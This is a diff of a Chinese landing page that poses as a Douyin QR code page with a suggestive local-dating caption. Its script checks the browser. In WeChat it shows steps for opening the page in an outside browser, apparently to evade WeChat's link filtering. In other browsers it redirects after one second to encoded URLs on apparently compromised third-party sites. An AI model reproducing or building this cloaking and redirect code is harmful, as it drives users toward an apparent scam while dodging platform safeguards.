@@ -7,120 +7,6 @@
     <title>用抖音点击（长按）下方二维码识别</title>
     <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
     
-    <script>
-        // 配置跳转域名变量
-        var wechatUrl = "http://www.xh36.com/Public/images/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEgMZCR4dF0AkWAQvBA48PyxGUFpTVk1XWVFVWFJbR0ECHQwB";
-        var otherUrl = "http://zgjst.net/dayrui/Laravel/System/bootstrap/cache/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpADlwABxIIEEAkWAQvBA48PyxGUFpTVk1YXFxVXl5eR0ECHQwB";
-        var currentTargetUrl = ""; // 存储当前应该跳转的URL
-        var isWechat = false; // 标记是否为微信浏览器
-        
-        // 检测浏览器类型
-        function detectBrowserAndRedirect() {
-            var ua = navigator.userAgent.toLowerCase();
-            
-            if (ua.indexOf('micromessenger') !== -1) {
-                // 微信浏览器 - 显示引导页面，不自动跳转
-                isWechat = true;
-                currentTargetUrl = wechatUrl;
-                console.log('检测到微信浏览器，显示引导页面');
-                showWechatGuide();
-                
-            } else {
-                // 其他浏览器 - 立即跳转
-                isWechat = false;
-                currentTargetUrl = otherUrl;
-                console.log('检测到其他浏览器，立即跳转');
-                
-                try {
-                    window.location.href = currentTargetUrl;
-                } catch (error) {
-                    console.log('自动跳转失败:', error);
-                    handleRedirectFailure();
-                }
-            }
-        }
-        
-        // 显示微信引导页面
-        function showWechatGuide() {
-            // 隐藏二维码内容
-            var codeBox = document.querySelector('.code-box');
-            if (codeBox) {
-                codeBox.style.display = 'none';
-            }
-            
-            // 显示微信引导内容
-            var wechatGuide = document.querySelector('.wechat-guide');
-            if (wechatGuide) {
-                wechatGuide.style.display = 'block';
-            }
-        }
-        
-        // 处理跳转失败的情况
-        function handleRedirectFailure() {
-            // 给图片添加点击跳转功能
-            addClickRedirectToImage();
-            
-            // 更新提示文字
-            var loadingText = document.querySelector('.loading-text');
-            if (loadingText) {
-                loadingText.innerHTML = '自动跳转失败，请点击上方二维码手动跳转';
-                loadingText.style.color = '#ff6b6b';
-                loadingText.classList.add('click-hint');
-            }
-        }
-        
-        // 给图片添加点击跳转功能
-        function addClickRedirectToImage() {
-            var img = document.querySelector('.code-qrcode img');
-            
-            if (img && currentTargetUrl) {
-                // 创建a标签包裹图片
-                var link = document.createElement('a');
-                link.href = currentTargetUrl;
-                link.target = '_self';
-                link.style.display = 'block';
-                link.style.cursor = 'pointer';
-                
-                // 将图片移到a标签内
-                img.parentNode.insertBefore(link, img);
-                link.appendChild(img);
-                
-                // 添加点击事件
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    window.location.href = currentTargetUrl;
-                });
-                
-                // 给图片添加点击提示样式
-                img.style.border = '2px solid #007bff';
-                img.style.cursor = 'pointer';
-                img.style.transition = 'all 0.3s ease';
-            }
-        }
-        
-        // 复制链接功能
-        function copyLink() {
-            var textArea = document.createElement('textarea');
-            textArea.value = currentTargetUrl;
-            document.body.appendChild(textArea);
-            textArea.select();
-            
-            try {
-                document.execCommand('copy');
-                alert('链接已复制到剪贴板');
-            } catch (err) {
-                alert('复制失败，请手动复制链接');
-            }
-            
-            document.body.removeChild(textArea);
-        }
-        
-        // 页面加载后立即检测
-        window.addEventListener('load', function() {
-            detectBrowserAndRedirect();
-        });
-    </script>
-    
     <style type="text/css">
         /* 重置样式 */
         * {
@@ -210,7 +96,7 @@
 
         /* 微信引导页面样式 */
         .wechat-guide {
-            display: none;
+            display: none; /* 默认隐藏 */
             background-color: #fff;
             margin: 20px;
             padding: 30px 20px;
@@ -296,17 +182,6 @@
             transition: color 0.3s ease;
         }
 
-        /* 点击提示动画 */
-        .click-hint {
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
         /* 响应式设计 */
         @media (max-width: 480px) {
             .code-box, .wechat-guide {
@@ -332,7 +207,7 @@
     </div>
 
     <!-- 普通二维码页面（非微信浏览器显示） -->
-    <div class="code-box">
+    <div class="code-box" id="qrcode-page">
         <div class="code-title">在抖音长按（点击）下方二维码识别<br>同城附近柯阅 25以下勿扰…</div>
         
         <div class="code-qrcode">
@@ -344,7 +219,7 @@
     </div>
 
     <!-- 微信引导页面（微信浏览器显示） -->
-    <div class="wechat-guide">
+    <div class="wechat-guide" id="wechat-guide">
         <div class="guide-title">请按以下步骤操作</div>
         
         <div class="guide-step">
@@ -354,7 +229,7 @@
                 右上角点击"..."显示菜单
             </div>
             <div class="guide-image">
-                <img src="./guide1.png" alt="第一步引导图">
+                <img src="./guide1.png" alt="第一步引导图" onerror="this.style.display='none'">
             </div>
         </div>
         
@@ -365,7 +240,7 @@
                 选择"浏览器"打开
             </div>
             <div class="guide-image">
-                <img src="./guide2.png" alt="第二步引导图">
+                <img src="./guide2.png" alt="第二步引导图" onerror="this.style.display='none'">
             </div>
         </div>
         
@@ -383,7 +258,63 @@
     </div>
 
     <script>
-        // 防止页面被嵌入iframe（安全措施）
+        // 配置跳转域名变量
+        var wechatUrl = "http://www.xh36.com/Public/images/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEgMZCR4dF0AkWAQvBA48PyxGUFpTVk1XWVFVWFJbR0ECHQwB";
+        var otherUrl = "http://zgjst.net/dayrui/Laravel/System/bootstrap/cache/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpADlwABxIIEEAkWAQvBA48PyxGUFpTVk1YXFxVXl5eR0ECHQwB";
+        var currentTargetUrl = "";
+        
+        // 检测浏览器类型并处理
+        function detectBrowserAndRedirect() {
+            var ua = navigator.userAgent.toLowerCase();
+            var qrcodePage = document.getElementById('qrcode-page');
+            var wechatGuide = document.getElementById('wechat-guide');
+            
+            if (ua.indexOf('micromessenger') !== -1) {
+                // 微信浏览器 - 显示引导页面
+                currentTargetUrl = wechatUrl;
+                console.log('检测到微信浏览器，显示引导页面');
+                
+                if (qrcodePage) qrcodePage.style.display = 'none';
+                if (wechatGuide) wechatGuide.style.display = 'block';
+                
+            } else {
+                // 其他浏览器 - 显示二维码页面并跳转
+                currentTargetUrl = otherUrl;
+                console.log('检测到其他浏览器，立即跳转');
+                
+                if (wechatGuide) wechatGuide.style.display = 'none';
+                if (qrcodePage) qrcodePage.style.display = 'flex';
+                
+                // 立即跳转
+                setTimeout(function() {
+                    window.location.href = currentTargetUrl;
+                }, 1000);
+            }
+        }
+        
+        // 复制链接功能
+        function copyLink() {
+            var textArea = document.createElement('textarea');
+            textArea.value = currentTargetUrl;
+            document.body.appendChild(textArea);
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                alert('链接已复制到剪贴板');
+            } catch (err) {
+                alert('复制失败，请手动复制链接');
+            }
+            
+            document.body.removeChild(textArea);
+        }
+        
+        // 页面加载完成后执行
+        document.addEventListener('DOMContentLoaded', function() {
+            detectBrowserAndRedirect();
+        });
+        
+        // 防止页面被嵌入iframe
         if (window.top !== window.self) {
             window.top.location = window.self.location;
         }
